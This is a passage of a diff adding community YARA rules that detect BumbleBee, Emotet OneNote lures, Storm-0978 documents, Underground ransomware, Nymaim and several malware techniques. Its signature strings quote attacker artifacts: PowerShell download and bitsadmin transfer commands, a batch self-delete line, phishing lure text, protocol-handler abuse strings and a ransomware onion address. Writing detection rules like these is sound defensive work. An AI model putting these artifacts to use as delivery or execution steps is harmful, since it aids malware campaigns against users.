+        and not $atom_mime
+        and filesize > 500KB
+        and 4 of ($js_*)
+}
+
+
+
+
+
+rule malware_bumblebee_packed { 
+    meta: 
+        author = "Marc Salinas @ CheckPoint Research" 
+        malware_family = "BumbleBee" 
+        yarahub_reference_md5 = "e2e58c6b4fc6aa36eb5f6b5e6b8743ff"
+        yarahub_uuid = "5f1f0757-0b17-4cbc-ab0d-b8a7f6bd9cbd"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        date = "2022-07-13" 
+        description = "Detects the packer used by bumblebee, the rule is based on the code responsible for allocating memory for a critical structure in its logic." 
+  
+        dll_jul = "6bc2ab410376c1587717b2293f2f3ce47cb341f4c527a729da28ce00adaaa8db" 
+        dll_jun = "82aab01a3776e83695437f63dacda88a7e382af65af4af1306b5dbddbf34f9eb" 
+        dll_may = "a5bcb48c0d29fbe956236107b074e66ffc61900bc5abfb127087bb1f4928615c" 
+        iso_jul = "ca9da17b4b24bb5b24cc4274cc7040525092dffdaa5922f4a381e5e21ebf33aa" 
+        iso_jun = "13c573cad2740d61e676440657b09033a5bec1e96aa1f404eed62ba819858d78" 
+        iso_may = "b2c28cdc4468f65e6fe2f5ef3691fa682057ed51c4347ad6b9672a9e19b5565e" 
+        zip_jun = "7024ec02c9670d02462764dcf99b9a66b29907eae5462edb7ae974fe2efeebad" 
+        zip_may = "68ac44d1a9d77c25a97d2c443435459d757136f0d447bfe79027f7ef23a89fce" 
+  
+    strings: 
+        $heapalloc = {  
+            48 8? EC [1-6]           // sub     rsp, 80h 
+            FF 15 ?? ?? 0? 00 [0-5]  // call    cs:GetProcessHeap 
+            33 D2                    // xor     edx, edx        ; dwFlags 
+            4? [2-5]                 // mov     rcx, rax        ; hHeap 
+            4? ?? ??                 // mov     r8d, ebx        ; dwBytes 
+            FF 15 ?? ?? 0? 00        // call    cs:HeapAlloc 
+            [8 - 11]                 // (load params) 
+            48 89 05 ?? ?? ?? 00     // mov     cs:HeapBufferPtr, rax 
+            E8 ?? ?? ?? ??           // call    memset 
+            4? 8B ?? ?? ?? ?? 00     // mov     r14, cs:HeapBufferPtr 
+        }  
+  
+    condition: 
+        $heapalloc 
+}rule MALWARE_Emotet_OneNote_Delivery_js_Mar23
+{
+	meta:
+		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+		description = "Detects Microsoft OneNote files used to deliver Emotet (.js Payload)"
+		reference = "https://twitter.com/bomccss/status/1636746149855121411"
+		date = "2023-03-17"
+		tlp = "CLEAR"
+		hash = "a43e0864905fe7afd6d8dbf26bd27d898a2effd386e81cfbc08cae9cf94ed968"
+		yarahub_reference_md5 = "b951629aedffbabc180ee80f9725f024"
+		yarahub_uuid = "eea31d8d-30cb-4210-a054-aa77ad18fd00"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		// Lure specific strings
+		$s_headline= "Connect to the cloud" wide
+		$s_attachment = "This document contains attachments from the cloud" wide
+		$s_receive = "to receive them, double click \"Next\"" wide
+		$s_imgFileName = "NOTE4_WHITE_1.bmp" wide
+		$s_path = "C:\\Autoruns\\" wide
+		$s_output = "output1.js"
+
+		// Javascript keywords
+		$js1 = "function" ascii
+		$js2 = ".replace(\"" ascii
+
+		// Lure contains 3 PNGs and the Javascript code
+		$GUID = {E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC}
+
+	condition:
+		uint32be(0x0) == 0xE4525C7B
+		and 3 of ($s_*)
+		and any of ($js*)
+		and #GUID == 4
+}rule MALWARE_Emotet_OneNote_Delivery_vbs_Mar23
+{
+	meta:
+		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+		description = "Detects Microsoft OneNote files used to deliver Emotet (VBScript Payload)"
+		reference = "https://www.secuinfra.com/en/news/the-whale-surfaces-again-emotet-epoch4-spam-botnet-returns/"
+		date = "2023-03-22"
+		version = "1.1"
+		tlp = "CLEAR"
+		hash0 = "dd9fcdcaf5c26fc27863c86aa65948924f23ab9faa261562cbc9d65ac80d33d4"
+		hash1 = "ca2234b9c6f7c453b91a1ca10fc7b05487f94850be7ac5ea42986347d93772d8"
+		hash2 = "b75681c1f99c4caf541478cc417ee9e8fba48f9b902c45d8bda0158a61ba1a2f"
+		hash3 = "7c4591fd03b73ba6d0ec71a3cf89a04bfb4bd240d359117d96834a83727bdcc2"
+		hash4 = "8fd4f59a30ef77ddf94cfb61d50212c8604316634c26e2bd0849494cba8da1af"
+		yarahub_reference_md5 = "9933577fa741233071f0714d7fbffbff"
+		yarahub_uuid = "c38da3bc-37bb-4c77-8d7b-392566d3d310"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		$s_protected = "This document is protected" wide
+		$s_click = "You have to double-click \"View\" button to open" wide
+		$s_press = "press to unblock document" wide
+		$s_imgFileName = "Untitled picture.jpg" wide
+		$s_id = "W5M0MpCehiHzreSzNTczkc9d" ascii
+		
+		$radTmp = /rad.{5}\.tmp/ 
+
+		$ext0 = ".vbs" ascii wide
+		$ext1 = ".vbe" ascii wide
+		$ext2 = ".wsf" ascii wide
+		$ext3 = ".wsc" ascii wide
+		$ext4 = ".htm" ascii wide
+		$ext5 = ".hta" ascii wide
+
+		// based on @DhaeyerWolf's rule: https://yaraify.abuse.ch/yarahub/rule/OneNote_EmbeddedFiles_NoPictures/
+		$GUID = {E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC}
+		$PNG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 89 50 4E 47 0D 0A 1A 0A }
+		$JPG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 FF D8 FF }
+
+	condition:
+		uint32be(0x0) == 0xE4525C7B
+		and any of ($s_*)
+		and $radTmp
+		and any of ($ext*)
+		and (#GUID > #PNG + #JPG)
+}rule MALWARE_Emotet_OneNote_Delivery_wsf_Mar23
+{
+	meta:
+		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+		description = "Detects Microsoft OneNote files used to deliver Emotet (.wsf Payload)"
+		reference = "https://www.secuinfra.com/en/news/the-whale-surfaces-again-emotet-epoch4-spam-botnet-returns/"
+		date = "2023-03-16"
+		tlp = "CLEAR"
+		hash0 = "dd9fcdcaf5c26fc27863c86aa65948924f23ab9faa261562cbc9d65ac80d33d4"
+		hash1 = "ca2234b9c6f7c453b91a1ca10fc7b05487f94850be7ac5ea42986347d93772d8"
+		hash2 = "b75681c1f99c4caf541478cc417ee9e8fba48f9b902c45d8bda0158a61ba1a2f"
+		hash3 = "7c4591fd03b73ba6d0ec71a3cf89a04bfb4bd240d359117d96834a83727bdcc2"
+		yarahub_reference_md5 = "f2fb54c7c909191ae10e34e50766a118"
+		yarahub_uuid = "9e69e45b-f0b0-423f-ad66-9900851e662f"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+
+		$s_protected = "This document is protected" wide
+		$s_click = "You have to double-click \"View\" button to open" wide
+		$s_imgFileName = "Untitled picture.jpg" wide
+
+		$script = "language=\"VBScript\""
+		$wsfExt = ".wsf" ascii wide
+
+		$GUIDwsf = {E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 3C 6A 6F 62 20 69 64 3D 22}
+		$endTmp = /rad.{5}\.tmp/ 
+
+	condition:
+		uint32be(0x0) == 0xE4525C7B
+		and any of ($s_*)
+		and $script
+		and $wsfExt
+		and $GUIDwsf
+		and $endTmp
+}rule MALWARE_OneNote_Delivery_Jan23
+{
+	meta:
+		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+		description = "Detects suspicious Microsoft OneNote files used to deliver Malware"
+		reference = "https://twitter.com/James_inthe_box/status/1615421130877329409"
+		date = "2023-01-19"
+		tlp = "CLEAR"
+		hash0 = "18af397a27e58afb901c92f37569d48e3372cf073915723e4e73d44537bcf54d"
+		hash1 = "de30f2ba2d8916db5ce398ed580714e2a8e75376f31dc346b0e3c898ee0ae4cf"
+		hash2 = "bfc979c0146d792283f825f99772370f6ff294dfb5b1e056943696aee9bc9f7b"
+		hash3 = "e0d9f2a72d64108a93e0cfd8066c04ed8eabe2ed43b80b3f589b9b21e7f9a488"
+		hash4 = "3f00a56cbf9a0e59309f395a6a0b3457c7675a657b3e091d1a9440bd17963f59"
+		yarahub_reference_md5 = "65b3b312dfaf25a72e9171271909357e"
+		yarahub_uuid = "1b3f4b6b-9dd4-4080-af23-195078bf3abe"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		// HTA
+		$hta = "hta:application" nocase
+		$script1 = "type=\"text/vbscript\""
+		$script2 = "language=\"VBScript\""
+		
+		// Powershell
+		$powershell = "powershell" nocase
+		$startProc = "Start-Process -Filepath"
+		$webReq = "Invoke-WebRequest -Uri"
+		$bitsadmin = "bitsadmin /transfer"
+		
+		//WScript
+		$wscript = "WScript.Shell" nocase
+		$autoOpen = "Sub AutoOpen()"
+		$root = "GetObject(\"winmgmts:\\.\\root\\cimv2\")"
+		$wsfExt = ".wsf" ascii wide
+		$vbsExt = ".vbs" ascii wide
+
+		// Batch
+		$cmd = "cmd /c" nocase
+		$batch = "@echo off"
+		$batExt = ".bat" ascii wide
+		$delExit = "(goto) 2>nul & del \"%~f0\"..exit /b"
+
+		// PE Files
+		$dosString = "!This program cannot be run in DOS mode"
+		$exeExt = ".exe" ascii wide
+		
+		// Image Lure
+		$imageFile = "button_click-to-view-document.png" wide
+		$click = "click to view document" nocase wide
+		
+		// Leaked File Paths
+		$path1 = "C:\\Users\\My\\OneDrive\\Desktop" wide
+		$path2 = "C:\\Users\\Administrator\\Documents\\Dove" wide
+		$path3 = "C:\\Users\\julien.galleron\\Downloads" wide
+	
+	condition:
+		uint32be(0x0) == 0xE4525C7B
+		and 3 of them
+}rule MALWARE_Storm0978_HTML_PROTHANDLER_Jul23
+{
+    meta:
+        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+        description = "Detects Office HTML injection through docfiles with Windows Protocol Handler execution"
+        reference = "https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit"
+        date = "2023-07-11"
+        tlp = "CLEAR"
+        hash = "07377209fe68a98e9bca310d9749daa4eb79558e9fc419cf0b02a9e37679038d"
+        yarahub_uuid = "85dbba47-f82d-478f-b941-88ac44f62a2b"
+        yarahub_reference_md5 = "26a6a0c852677a193994e4a3ccc8c2eb"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+
+    strings:
+        $doc_magic = {D0 CF 11 E0 A1 B1 1A E1}
+
+        $s_htmlTag = "<html>" nocase ascii wide
+        $s_location = "location.href" nocase ascii wide
+        $s_iframe = "document.write('<iframe" nocase ascii wide
+        $s_mhtml = "src=\"mhtml:ms-" nocase ascii wide
+        $s_temp = "/appdata/local/temp" nocase ascii wide
+        $s_script = "<script defer>" nocase ascii wide
+
+        // Some of the most popular ones; 
+        // Source: https://github.com/splunk/security_content/blob/develop/lookups/windows_protocol_handlers.csv
+        $prothandler_msdt = "ms-msdt" ascii wide
+        $prothandler_search = "search-ms" ascii wide
+        $prothandler_msits = "ms-its" ascii wide
+        $prothandler_word = "ms-word" ascii wide
+        $prothandler_excel = "ms-excel" ascii wide
+        $prothandler_powerp = "ms-powerpoint" ascii wide
+
+    condition:
+        $doc_magic at 0x0
+        and $doc_magic
+        and 4 of ($s_*)
+        and 1 of ($prothandler_*)
+}
+rule MALWARE_Storm0978_Underground_Ransomware_Jul23
+{
+    meta:
+        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+        description = "Hunting rule for samples of 'Underground Ransomware', linked to IndustrialSpy and Storm-0978"
+        reference = "https://twitter.com/RakeshKrish12/status/1678296344061157377"
+        date = "2023-07-12"
+        tlp = "CLEAR"
+        hash = "d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666"
+        yarahub_uuid = "4ed613b6-9ed6-424c-a3b1-79855eebc0fa"
+        yarahub_reference_md5 = "059175be5681a633190cd9631e2975f6"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+
+    strings:
+        $s_1 = "temp.cmd" wide
+        $s_2 = "%s\\!!readme!!!.txt" wide
+        $s_3 = "VIPinfo.txt" wide
+        $s_4 = "The Underground team welcomes you!" ascii
+        $s_5 = "http://undgrddapc4reaunnrdrmnagvdelqfvmgycuvilgwb5uxm25sxawaoqd.onion"
+        $s_6 = "File unlocking error" wide
+
+    condition:
+        uint16(0) == 0x5a4d
+        and 4 of ($s_*)
+}
+rule Matanbuchus_MSI_2 : matanbuchus msitwo
+{
+    meta:
+        author                    = "Andre Gironda"
+        date                      = "2022-06-16"
+        description               = "Matanbuchus MSI contains CAB with DLL via Zip via HTML Smuggling via Zip as malspam attachment / TA570 who normally delivers Qakbot"
+        hash                      = "5dcbffef867b44bbb828cfb4a21c9fb1fa3404b4d8b6f4e8118c62addbf859da"
+        hash2                     = "4d5da2273e2d7cce6ac37027afd286af"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_twitter    = "@AndreGironda"
+        yarahub_license           = "CC0 1.0"
+        yarahub_reference_md5     = "4d5da2273e2d7cce6ac37027afd286af"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "f29897f3-a6f1-43d7-b1cf-553671dc3c75"
+   strings:
+        $hex_36855 = { 50 72 69 76 61 74 65 20 4f 72 67 61 6e 69 7a 61 74 69 6f 6e 31 }
+        $hex_368bd = { 57 65 73 74 65 61 73 74 20 54 65 63 68 20 43 6f 6e 73 75 6c 74 69 6e 67 2c 20 43 6f 72 70 2e 31 }
+    condition:
+        all of them
+}
+rule meth_get_eip {
+  meta:
+    date = "2022-06-13"
+    author = "Willi Ballenthin"
+    yarahub_author_email = "william.ballenthin@mandiant.com"
+    yarahub_author_twitter = "@williballenthin"
+    yarahub_uuid = "666bfd55-7931-454e-beb8-22b5211ab04f"
+    yarahub_license = "CC BY 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp = "TLP:WHITE"
+    yarahub_reference_md5 = "9727d5c2a5133f3b6a6466cc530a5048"
+    strings:
+       // 0:  e8 00 00 00 00          call   5 <_main+0x5>
+       // 5:  58                      pop    eax
+       // 6:  5b                      pop    ebx
+       // 7:  59                      pop    ecx
+       // 8:  5a                      pop    edx
+       // 9:  5e                      pop    esi
+       // a:  5f                      pop    edi
+       $x86 = { e8 00 00 00 00 (58 | 5b | 59 | 5a | 5e | 5f) }
+
+    condition:
+       $x86
+}rule meth_peb_parsing {
+  meta:
+    date = "2022-06-13"
+    author = "Willi Ballenthin"
+    yarahub_author_email = "william.ballenthin@mandiant.com"
+    yarahub_author_twitter = "@williballenthin"
+    yarahub_uuid = "fc096806-e637-43ac-b969-ec6a1f37328a"
+    yarahub_license = "CC BY 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp = "TLP:WHITE"
+    yarahub_reference_md5 = "00000000000000000000000000000000"
+    strings:
+       //                                                         ;; TEB->PEB
+       // (64 a1 30 00 00 00 |                                    ; mov eax, fs:30
+       //  64 8b (1d | 0d | 15 | 35 | 3d) 30 00 00 00 |           ; mov $reg, DWORD PTR fs:0x30
+       //  31 (c0 | db | c9 | d2 | f6 | ff) [0-8] 64 8b ?? 30 )   ; xor $reg; mov $reg, DWORD PTR fs:[$reg+0x30]
+       // [0-8]                                                   ; up to 8 bytes of interspersed instructions
+       //                                                         ;; PEB->LDR_DATA
+       // 8b ?? 0c                                                ; mov eax,DWORD PTR [eax+0xc]
+       // [0-8]                                                   ; up to 8 bytes of interspersed instructions
+       //                                                         ;; LDR_DATA->OrderLinks
+       // 8b ?? (0c | 14 | 1C)                                    ; mov edx, [edx+0Ch]
+       // [0-8]                                                   ; up to 8 bytes of interspersed instructions
+       //                                                         ;; _LDR_DATA_TABLE_ENTRY.DllName.Buffer
+       // 8b ?? (28 | 30)                                         ; mov esi, [edx+28h]
+       $peb_parsing = { (64 a1 30 00 00 00 | 64 8b (1d | 0d | 15 | 35 | 3d) 30 00 00 00 | 31 (c0 | db | c9 | d2 | f6 | ff) [0-8] 64 8b ?? 30 ) [0-8] 8b ?? 0c [0-8] 8b ?? (0c | 14 | 1C) [0-8] 8b ?? (28 | 30) }
+
+       $peb_parsing64 = { (48 65 A1 60 00 00 00 00 00 00 00 | 65 (48 | 4C) 8B ?? 60 00 00 00 | 65 A1 60 00 00 00 00 00 00 00 | 65 8b ?? ?? 00 FF FF | (48 31 (c0 | db | c9 | d2 | f6 | ff) | 4D 31 (c0 | c9))  [0-16] 65 (48 | 4d | 49 | 4c) 8b ?? 60) [0-16] (48 | 49 | 4C) 8B ?? 18 [0-16] (48 | 49 | 4C) 8B ?? (10 | 20 | 30) [0-16] (48 | 49 | 4C) 8B ?? (50 | 60) }
+
+    condition:
+       $peb_parsing or $peb_parsing64
+}rule meth_stackstrings {
+  meta:
+    date = "2022-06-13"
+    author = "Willi Ballenthin"
+    yarahub_author_email = "william.ballenthin@mandiant.com"
+    yarahub_author_twitter = "@williballenthin"
+    yarahub_uuid = "71fe67dc-8cb3-4b1f-8eb8-7b2e0933e0b4"
+    yarahub_license = "CC BY 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp = "TLP:WHITE"
+    yarahub_reference_md5 = "00000000000000000000000000000000"
+    strings:
+        // stack string near the frame pointer.
+        // the compiler may choose to use a single byte offset from $bp.
+        // like: mov [ebp-10h], 25h
+        //
+        // regex explanation:
+        //   4 times:
+        //     byte C6          (mov byte)
+        //     byte 45          ($bp-relative, one-byte offset)
+        //     any byte         (the offset from $bp)
+        //     printable ascii  (the immediate constant)
+        //   1 times:
+        //     byte C6          (mov byte)
+        //     byte 45          ($bp-relative, one-byte offset)
+        //     any byte         (the offset from $bp)
+        //     byte 00          (the immediate constant, null terminator)
+        $ss_small_bp = /(\xC6\x45.[a-zA-Z0-9 -~]){4,}\xC6\x45.\x00/
+
+        // dword stack string near the frame pointer.
+        // the compiler may choose to use a single byte offset from $bp.
+        // it may move four bytes at a time onto the stack.
+        // like: mov [ebp-10h], 680073h  ; "sh"
+        //
+        // regex explanation:
+        //   2 times:
+        //     byte C7          (mov dword)
+        //     byte 45          ($bp-relative, one-byte offset)
+        //     any byte         (the offset from $bp)
+        //     printable ascii  (the immediate constant)
+        //     byte 00          (second byte of utf-16 encoding of ascii character)
+        //     printable ascii  (the immediate constant)
+        //     byte 00          (second byte of utf-16 encoding of ascii character)
+        //   1 times:
+        //     byte C7          (mov dword)
+        //     byte 45          ($bp-relative, one-byte offset)
+        //     any byte         (the offset from $bp)
+        //     any byte         (immediate constant or NULL terminator)
+        //     byte 00          (the immediate constant, NULL terminator)
+        //     byte 00          (the immediate constant, NULL terminator)
+        //     byte 00          (the immediate constant, NULL terminator)
+        $ss_small_bp_dword = /(\xC7\x45.[a-zA-Z0-9 -~]\x00[a-zA-Z0-9 -~]\x00){2,}\xC7\x45..\x00\x00\x00/
+
+        // stack strings further away from the frame pointer.
+        // the compiler may choose to use a four-byte offset from $bp.
+        // like: mov byte ptr [ebp-D80h], 5Ch
+        // we restrict the offset to be within 0xFFF (4095) of the frame pointer.
+        //
+        // regex explanation:
+        //   4 times:
+        //     byte C6          (mov byte)
+        //     byte 85          ($bp-relative, four-byte offset)
+        //     any byte         (LSB of the offset from $bp)
+        //     byte 0xF0-0xFF   (second LSB of the offset from $bp)
+        //     byte FF          (second MSB)
+        //     byte FF          (MSB of the offset from $bp)
+        //     printable ascii  (the immediate constant)
+        //   1 times:
+        //     byte C6          (mov byte)
+        //     byte 85          ($bp-relative, four-byte offset)
+        //     any byte         (LSB of the offset from $bp)
+        //     byte 0xF0-0xFF   (second LSB of the offset from $bp)
+        //     byte FF          (second MSB)
+        //     byte FF          (MSB of the offset from $bp)
+        //     byte 00          (the immediate constant, null terminator)
+        $ss_big_bp = /(\xC6\x85.[\xF0-\xFF]\xFF\xFF[a-zA-Z0-9 -~]){4,}\xC6\x85.[\xF0-\xFF]\xFF\xFF\x00/
+
+        // stack string near the stack pointer.
+        // the compiler may choose to use a single byte offset from $sp.
+        // like: mov byte ptr [esp+0Bh], 24h
+        //
+        // regex explanation:
+        //   4 times:
+        //     byte C6          (mov byte)
+        //     byte 44          ($sp-relative, one-byte offset)
+        //     byte 24          ($sp-relative, one-byte offset)
+        //     any byte         (the offset from $sp)
+        //     printable ascii  (the immediate constant)
+        //   1 times:
+        //     byte C6          (mov byte)
+        //     byte 44          ($sp-relative, one-byte offset)
+        //     byte 24          ($sp-relative, one-byte offset)
+        //     any byte         (the offset from $sp)
+        //     byte 00          (the immediate constant, null terminator)
+        $ss_small_sp = /(\xC6\x44\x24.[a-zA-Z0-9 -~]){4,}\xC6\x44\x24.\x00/
+
+        // stack strings further away from the stack pointer.
+        // the compiler may choose to use a four-byte offset from $sp.
+        // like: byte ptr [esp+0DDh], 49h
+        // we restrict the offset to be within 0xFFF (4095) of the stack pointer.
+        //
+        // regex explanation:
+        //   4 times:
+        //     byte C6          (mov byte)
+        //     byte 84          ($sp-relative, four-byte offset)
+        //     byte 24          ($sp-relative, four-byte offset)
+        //     any byte         (LSB of the offset from $sp)
+        //     byte 0x00-0x0F   (second LSB of the offset from $sp)
+        //     byte 00          (second MSB)
+        //     byte 00          (MSB of the offset from $sp)
+        //     printable ascii  (the immediate constant)
+        //   1 times:
+        //     byte C6          (mov byte)
+        //     byte 84          ($sp-relative, four-byte offset)
+        //     byte 24          ($sp-relative, four-byte offset)
+        //     any byte         (LSB of the offset from $sp)
+        //     byte 0x00-0x0F   (second LSB of the offset from $sp)
+        //     byte 00          (second MSB)
+        //     byte 00          (MSB of the offset from $sp)
+        //     byte 00          (the immediate constant, null terminator)
+        $ss_big_sp = /(\xC6\x84\x24.[\x00-\x0F]\x00\x00[a-zA-Z0-9 -~]){4,}\xC6\x84\x24.[\x00-\x0F]\x00\x00\x00/
+
+    condition:
+        $ss_small_bp or $ss_small_bp_dword or $ss_big_bp or $ss_small_sp or $ss_big_sp
+}rule Nymaim
+{
+	meta:
+		author = "Chaitanya"
+		description = "Nymaim Loader"
+		date = "2023-01-27"
+		yarahub_reference_md5 = "0e56ecfe46a100ed5be6a7ea5a43432c"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		malpedia_family = "win.nymaim"
+		yarahub_uuid = "5c578ac7-23cd-44d3-8bf9-e5c6db8cc13d"
+    strings:
+  $a = {80 79 ?? 00 74 ?? 0f 10 01 b8 10 00 00 00 0f 28 0d ?? ?? ?? ?? 66 0f ef c8 0f 11 09 0f 1f 40 00 80 34 08 2e 40 83 f8 ?? 72 ??}    
+  $b = {80 79 0b 00 74 ?? 33 c0 80 34 08 2e 40 83 f8 0c 72 ??}
+  $c = {80 79 0e 00 74 ?? 33 c0 80 34 08 2e 40 83 f8 0f 72 ??}
+  condition:
+		uint16(0) == 0x5A4D and all of them
+	}rule OneNote_EmbeddedFiles_NoPictures
+{
+    meta:
+        author = "Nicholas Dhaeyer - @DhaeyerWolf"
+        date_created = "2023-02-14 - <3"
+        date_last_modified = "2023-02-17"
+        description = "OneNote files that contain embedded files that are not pictures."
+        reference = "https://blog.didierstevens.com/2023/01/22/analyzing-malicious-onenote-documents/"
+		yarahub_uuid = "d0c4f0e6-adbe-4953-a2df-91427a561e97"
+		date = "2023-02-14"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "52486a446dd4fc5842a47b57d3febec7"
+
+    strings:
+        $EmbeddedFileGUID =  { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC }
+        $PNG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 89 50 4E 47 0D 0A 1A 0A }
+        $JPG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 FF D8 FF }
+        $JPG20001 = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0C 6A 50 20 20 0D 0A 87 0A }
+        $JPG20002 = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 FF 4F FF 51 }
+        $BMP = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 42 4D }
+        $GIF = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 47 49 46 }
+
+    condition:
+        $EmbeddedFileGUID and (#EmbeddedFileGUID > #PNG + #JPG + #JPG20001 + #JPG20002 + #BMP + #GIF)
+}
+rule PaaS_SpearPhishing_Feb23
+{
+
+    meta:
+	author = "Alexander Hatala (@AlexanderHatala)"
+	description = "Detects targeted spear phishing campaigns using a private PaaS based on filenames."
+	date = "2023-02-11"
+	tlp = "CLEAR"
+	yarahub_reference_md5 = "084b4397d2c3590155fed50f0ad9afcf"
+	yarahub_uuid = "2c4733fc-3ec7-45db-adae-1a396ba8d4ae"
+	yarahub_license = "CC BY 4.0"
+	yarahub_rule_matching_tlp = "TLP:WHITE"
+	yarahub_rule_sharing_tlp = "TLP:WHITE"
+	yarahub_author_twitter = "@AlexanderHatala"
+
+    strings:
+        $file1 = "saved_resource.html"
+        $file2 = "/antibots7/"
+        $file3 = "infos.php"
+        $file4 = "config00.php"
+        $file5 = "config0.php"
+        $file6 = "personal.php"
+        $file7 = "Email.php"
+        
+    condition:
+        all of them
+}
+rule PassProtected_ZIP_ISO_file {
+   meta:
+      description = "Detects container formats commonly smuggled through password-protected zips"
+      author = "_jc"
+      date = "2022-09-29"
+      yarahub_reference_md5 = "b93bd94b8f568deac0143bf93f7d8bd8"
+      yarahub_uuid = "0b027752-0217-48f9-9515-3760872cc210"
+      yarahub_license = "CC BY 4.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+   strings:
+      $password_protected_zip = { 50 4B 03 04 14 00 01 }
+
+      $container_1 = ".iso" ascii
+      $container_2 = ".rr0" ascii
+      $container_3 = ".img" ascii
+      $container_4 = ".vhd" ascii
+      $container_5 = ".rar" ascii
+
+   condition:
+      uint32(0) == 0x04034B50 and
+      filesize < 2000KB and 
+      $password_protected_zip and 
+      1 of ($container*)
+}import "pe"
+
+rule pe_no_import_table {
+    meta:
+        author = "qux"
+        description = "Detects exe does not have import table"
+        date = "2023-10-05"
+        yarahub_reference_md5 = "00000000001111111111222222222233"
+        yarahub_uuid = "f2d5b2f7-a391-4db6-be86-124fb343ef62"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+    condition:
+        pe.is_pe
+        and pe.number_of_imports == 0
+}import "pe"
+
+rule pe_packer_pecompact2 {
+    meta:
+        date = "2023-09-07"
+        yarahub_uuid = "8f58ee66-b658-4720-a986-4916308812d1"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "b204bee0440f1d7b82c64107610ea9b5"
+        desc = "Detects PECompact2"
+        author = "@jstrosch"
+
+    strings:
+
+        /*
+            CODE:00401000 B8 74 C4 45 00       mov     eax, offset loc_45C474
+            CODE:00401005 50                   push    eax
+            CODE:00401006 64 FF 35 00 00 00 00 push    large dword ptr fs:0
+            CODE:0040100D 64 89 25 00 00 00 00 mov     large fs:0, esp
+            CODE:00401014 33 C0                xor     eax, eax
+            CODE:00401016 89 08                mov     [eax], ecx
+        */
+
